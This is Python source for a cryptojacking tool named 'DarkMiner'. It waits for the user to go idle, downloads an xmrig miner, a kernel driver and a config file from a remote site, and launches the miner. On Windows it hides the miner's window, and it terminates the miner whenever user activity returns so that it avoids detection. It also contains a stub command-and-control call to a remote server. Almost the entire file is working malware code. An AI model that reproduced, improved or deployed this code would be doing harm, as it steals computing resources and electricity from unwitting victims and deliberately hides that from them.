# Version 1 12/28/19 (start date)
# Vary basic rewrite of c++ code that spawns and kills miners when activity is detected
# Works on Linux & Windows 64bit operating systems
# Does not set anything into registry to start the program on start
# Does not connect to a command and control server
# Does not do a lot of things but it works as basic start

import sys
import platform
import os
import time
import subprocess

waitTime = 5
WinPathDownloads = 'C:/Users/' + os.getlogin() + '/Downloads/'
LinuxPathDownloads = '/tmp/DarkMiner/'
BaseSite = 'https://localhost.com/DarkMiner/'


def CommandAndControl():
    import requests
    URL = BaseSite + 'blog.php'
    PARAMS = {'name': location}
    r = requests.get(url=URL, params=PARAMS)
    data = r.json()


def LinuxIdleTime():
    from idle_time import IdleMonitor
    monitor = IdleMonitor.get_monitor()
    IdleTimeSet = monitor.get_idle_time()
    while True:
        IdleTimeSet = monitor.get_idle_time()
        if waitTime <= IdleTimeSet:
            print('Idle for 60 Seconds')
            break
        print(IdleTimeSet)
        time.sleep(waitTime-IdleTimeSet)


def WindowsIdleTime():
    import win32api
    while True:
        print('CheckLoop')
        LastActivity = win32api.GetLastInputInfo()
        time.sleep(waitTime)
        if LastActivity == win32api.GetLastInputInfo():
            print('No Activity ~ Prepare to launch!')
            break


def Is64Windows():
    return 'PROGRAMFILES(X86)' in os.environ


def GetProgramFiles32():
    if Is64Windows():
        return False
    else:
        return True


def DownloadData(url, direc):
    import requests
    print('Beginning file download with requests')
    r = requests.get(url)
    with open(direc, 'wb') as f:
        f.write(r.content)
        print('Success Downloading files')


def Miner():
    if osSystem == 'win32':
        if not os32Bit:
            if os.path.exists(WinPathDownloads + 'xmrig.exe'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'xmrig.exe', WinPathDownloads + 'xmrig.exe')
            if os.path.exists(WinPathDownloads + 'WinRing0x64.sys'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'WinRing64.sys', WinPathDownloads + 'WinRing0x64.sys')
            if os.path.exists(WinPathDownloads + 'config.json'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'config.json', WinPathDownloads + 'config.json')

            import win32gui
            import win32api
            proc = subprocess.Popen([WinPathDownloads + "xmrig.exe"])
            time.sleep(3)

            def enumWindowFunc(hwnd, windowList):
                """ win32gui.EnumWindows() callback """
                text = win32gui.GetWindowText(hwnd)
                className = win32gui.GetClassName(hwnd)
                if text.find("xmrig") >= 0:
                    windowList.append((hwnd, text, className))

            myWindows = []
            win32gui.EnumWindows(enumWindowFunc, myWindows)
            for hwnd, text, className in myWindows:
                win32gui.ShowWindow(hwnd, False)
            print('Running Miner waiting for action from user')
            while True:
                print('No Action')
                LastActivity = win32api.GetLastInputInfo()
                time.sleep(waitTime)
                if LastActivity != win32api.GetLastInputInfo():
                    print('Activity! Eject!')
                    proc.terminate()  # Terminates Child Process
                    break
            main()  # Back to our main fuction and loop
    elif osSystem == 'Linux':
        if is_64bits:
            if not os.path.exists(LinuxPathDownloads):
                os.mkdir(LinuxPathDownloads)
            print('ran')
            if os.path.exists(LinuxPathDownloads + 'xmrigcg'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'Linux/' + 'xmrigcg', LinuxPathDownloads + 'xmrigcg')
            if os.path.exists(LinuxPathDownloads + 'config.json'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'Linux/' + 'config.json', LinuxPathDownloads + 'config.json')
            from idle_time import IdleMonitor
            monitor = IdleMonitor.get_monitor()
            os.chmod(LinuxPathDownloads, 0o777)
            proc = subprocess.Popen([LinuxPathDownloads + "xmrigcg"])
            while True:
                IdleTimeSet = monitor.get_idle_time()
                if waitTime <= IdleTimeSet:
                    print('No activity')
                    time.sleep(3)
                else:
                    print('Activity! Eject!')
                    proc.terminate()  # Terminates Child Process
                    break
            main()


def main():
    print('Starting DarkMiner on ' + osSystem)
    if is_64bits:
        print('64bit Machine');
    if osSystem == 'win32':
        WindowsIdleTime()
    elif osSystem == 'Linux':
        LinuxIdleTime()
    Miner()


if sys.platform.startswith('win32'):
    osSystem = 'win32'
    os32Bit = GetProgramFiles32()
    main()
elif sys.platform.startswith('linux'):
    osSystem = 'Linux'
    is_64bits = sys.maxsize > 2 ** 32
    main()

# Mainly for getting machine information
# print(osSystem)
# print(os32Bit)
# print(processor)
